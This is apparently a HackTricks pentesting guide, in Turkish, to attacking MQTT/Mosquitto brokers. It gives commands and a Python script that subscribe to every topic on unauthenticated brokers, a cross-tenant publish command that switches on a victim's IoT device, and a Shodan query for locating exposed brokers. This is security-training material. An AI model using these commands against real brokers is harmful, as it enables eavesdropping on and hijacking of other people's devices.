# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## Temel Bilgiler

**MQ Telemetry Transport (MQTT)**, aşırı sadeliği ve hafifliğiyle öne çıkan bir **publish/subscribe mesajlaşma protokolü** olarak bilinir. Bu protokol, cihazların sınırlı yeteneklere sahip olduğu ve düşük bant genişliği, yüksek gecikme veya güvenilmez bağlantılarla karakterize edilen ağlarda çalışmak üzere özel olarak tasarlanmıştır. MQTT'nin temel hedefleri arasında ağ bant genişliği kullanımını en aza indirmek ve cihaz kaynaklarına olan yükü azaltmak yer alır. Ayrıca güvenilir iletişimi sürdürmeyi ve belirli bir teslimat garantisi sağlamayı amaçlar. Bu hedefler, MQTT'yi çok sayıda cihazın verimli şekilde bağlanmasının kritik olduğu **makineden makineye (M2M) iletişim** ve **Nesnelerin İnterneti (IoT)** alanları için son derece uygun hale getirir. Ayrıca, bant genişliği ve pil ömrünü korumanın kritik olduğu mobil uygulamalar için MQTT çok faydalıdır.

**Varsayılan port:** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## Trafiği İnceleme

Bir **CONNECT** paketi MQTT broker'lerine ulaştığında, bir **CONNACK** paketi geri gönderilir. Bu paket, bağlantı durumunu anlamak için kritik olan bir dönüş kodu içerir. Bir **0x00** dönüş kodu kimlik bilgilerinin kabul edildiği ve bağlantının başarılı olduğu anlamına gelir. Öte yandan, bir **0x05** dönüş kodu kimlik bilgilerinin geçersiz olduğunu bildirir ve bağlantının kurulmasını engeller.

Örneğin, broker kimlik bilgilerini geçersiz bulup bağlantıyı reddederse, senaryo şu şekilde olur:
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**Kimlik doğrulama tamamen isteğe bağlıdır** ve kimlik doğrulama yapılsa bile, **şifreleme varsayılan olarak kullanılmaz** (kimlik bilgileri açık metin olarak gönderilir). MITM saldırıları yine şifreleri çalmak için gerçekleştirilebilir.

Bir MQTT servisine bağlanmak için şu projeyi kullanabilirsiniz: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) ve tüm topic'lere abone olmak için şunu çalıştırın:
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
Ayrıca şunu da kullanabilirsiniz [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

Ayrıca şunları da kullanabilirsiniz:
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
**Veya kimlik doğrulama olmadan bir MQTT servisine bağlanmayı deneyip tüm konulara subscribe olup onları dinlemek için bu kodu çalıştırabilirsiniz:**
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### Yayın/Abone Modeli <a href="#b667" id="b667"></a>

Yayın/abone modeli şu bileşenlerden oluşur:

- **Publisher**: broker'da bir veya birden fazla topic'e mesaj yayınlayan taraf.
- **Subscriber**: broker'da bir veya birden fazla topic'e abone olur ve publisher'dan gelen tüm mesajları alır.
- **Broker**: publisher'lardan gelen tüm mesajları subscriber'lara yönlendirir.
- **Topic**: bir veya daha fazla seviyeden oluşur ve seviyeler ileri eğik çizgi ile ayrılır (ör. /smartshouse/livingroom/temperature).

### Paket Formatı <a href="#f15a" id="f15a"></a>

Her MQTT paketi sabit bir başlık içerir (Şekil 02). Şekil 02: Sabit Başlık

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Paket Türleri

- CONNECT (1): İstemci tarafından server'a bağlantı istemek için başlatılır.
- CONNACK (2): Server'ın başarılı bağlantıyı onaylaması.
- PUBLISH (3): İstemciden server'a veya tersi yönde mesaj göndermek için kullanılır.
- PUBACK (4): Bir PUBLISH paketinin onayı.
- PUBREC (5): Mesajın alındığını garanti eden teslim protokolünün bir parçası.
- PUBREL (6): Mesaj tesliminde ek güvence sağlayan, mesajın serbest bırakıldığını belirten paket.
- PUBCOMP (7): Mesaj teslim protokolünün son aşaması, tamamlandığını bildirir.
- SUBSCRIBE (8): Bir istemcinin bir topic'ten mesaj dinlemek için yaptığı istek.
- SUBACK (9): Server'ın SUBSCRIBE isteğini onaylaması.
- UNSUBSCRIBE (10): Bir istemcinin bir topic'ten mesaj almamayı talep etmesi.
- UNSUBACK (11): Server'ın UNSUBSCRIBE isteğine verdiği yanıt.
- PINGREQ (12): İstemci tarafından gönderilen bir heartbeat mesajı.
- PINGRESP (13): Server'ın heartbeat mesajına cevabı.
- DISCONNECT (14): İstemci tarafından bağlantıyı sonlandırmak için başlatılır.
- 0 ve 15 olmak üzere iki değer reserved olarak işaretlenmiştir ve kullanımları yasaktır.

## IoT MQTT ekosistem saldırıları: plaintext brokers and topic ACL bypass

Birçok tüketici IoT platformu, iki farklı rol tarafından kullanılan MQTT broker'larını açığa çıkarır:
- Radio protokollerini (ör. BLE/LoRa/Zigbee) buluta köprüleyen Gateway/hub cihazları.
- Cihazları “app” topic'leri aracılığıyla kontrol eden Mobile apps veya web backend'leri.

Bir pentest sırasında suistimal edebileceğiniz yaygın zayıflıklar:

- Plaintext MQTT over non-standard ports (ör. TCP/8001) yerine MQTTS kullanılmaması. Yolda bulunan herhangi bir gözlemci kimlik bilgilerini ve kontrol framelerini okuyabilir. Anormal portlarda cleartext CONNECT/CONNACK ve SUBSCRIBE/PUBLISH trafiğini tespit etmek için Wireshark kullanın.
- Zayıf veya eksik per-tenant topic ACLs. Eğer topic'ler sadece deviceId ile namespace'lenmişse (ör. "/tenantless/<deviceId>/tx"), doğrulanmış herhangi bir kullanıcı diğer tenant'ların cihazlarına PUBLISH yapabilir.
- Sensitive data leakage via maintenance/admin topics (ör. konfigürasyon değişikliklerinden sonra Wi‑Fi kimlik bilgilerinin cleartext olarak yayınlanması).

Örnekler (yer tutucuları gerçek değerlerle değiştirin):

Bilinen topic önekleri ve device ID'leri ile potansiyel olarak hassas topic'lere abone olun:
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
ACLs zayıf olduğunda tenant'lar arası kontrol (başka bir tenant'ın device topic'ine publish etmek):
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- IoT'te standart olmayan portlarda MQTT plaintext yaygındır. Broker'ları alternatif portlarda aramayı ve protocol detection ile doğrulamayı düşünün.

## Referanslar

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
